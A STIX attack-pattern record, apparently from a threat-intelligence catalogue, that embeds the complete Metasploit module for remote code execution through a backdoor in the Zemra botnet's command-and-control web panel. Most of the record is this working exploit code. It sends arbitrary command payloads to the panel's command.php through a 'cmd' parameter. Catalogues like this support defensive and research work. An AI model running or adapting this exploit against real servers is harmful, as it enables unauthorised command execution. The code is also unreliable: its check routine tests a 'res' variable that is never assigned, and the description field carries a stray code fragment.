{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--413736e9-82a4-4601-b4b3-0c5c91729950",
    "created": "2024-08-14T17:11:36.036053Z",
    "modified": "2024-08-14T17:11:36.036057Z",
    "name": "Zemra Botnet CnC Web Panel Remote Code Execution",
    "description": " This module exploits the CnC web panel of Zemra Botnet which contains a backdoor inside its leaked source code. Zemra is a crimeware bot that can be used to conduct DDoS attacks and is detected by Symantec as Backdoor.Zemra.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/zemra_panel_rce.rb",
            "external_id": "zemra_panel_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "http://0day.today/exploit/19259"
        },
        {
            "source_name": "reference",
            "url": "http://www.symantec.com/connect/blogs/ddos-attacks-zemra-bot"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Zemra Botnet CnC Web Panel Remote Code Execution',\n      'Description'    => %q{\n        This module exploits the CnC web panel of Zemra Botnet which contains a backdoor\n        inside its leaked source code. Zemra is a crimeware bot that can be used to\n        conduct DDoS attacks and is detected by Symantec as Backdoor.Zemra.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Jay Turla <@shipcod3>', #Metasploit Module\n          'Angel Injection', #Initial Discovery (PoC from Inj3ct0r Team)\n          'Darren Martyn <@info_dox>' #Initial Discovery\n        ],\n      'References'     =>\n        [\n          ['URL', 'http://0day.today/exploit/19259'],\n          ['URL', 'https://web.archive.org/web/20140207114942/http://insecurety.net/?p=144'], #leaked source code and backdoor intro\n          ['URL', 'http://www.symantec.com/connect/blogs/ddos-attacks-zemra-bot']\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'    => 10000,\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd'\n            }\n        },\n      'Platform'       => %w{ unix win },\n      'Arch'           => ARCH_CMD,\n      'Targets'        =>\n        [\n          ['zemra panel / Unix', { 'Platform' => 'unix' } ],\n          ['zemra panel / Windows', { 'Platform' => 'win' } ]\n        ],\n      'DisclosureDate' => '2012-06-28',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI',[true, \"The path of the backdoor inside Zemra Botnet CnC Web Panel\", \"/Zemra/Panel/Zemra/system/command.php\"]),\n      ])\n  end\n\n  def check\n    txt = Rex::Text.rand_text_alpha(8)\n    http_send_command(txt)\n    if res && res.body =~ /cmd/\n      return Exploit::CheckCode::Vulnerable\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def http_send_command(cmd)\n    uri = normalize_uri(target_uri.path.to_s)\n    res = send_request_cgi({\n      'method'  => 'GET',\n      'uri'             => uri,\n      'vars_get'        =>\n        {\n          'cmd' => cmd\n        }\n    })\n    unless res && res.code == 200\n      fail_with(Failure::Unknown, 'Failed to execute the command.')\n    end\n    res\n  end\n\n  def exploit\n    http_send_command(payload.encoded)\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-06-28",
    "x_mitre_platforms": [
        "%w{ unix win }"
    ]
}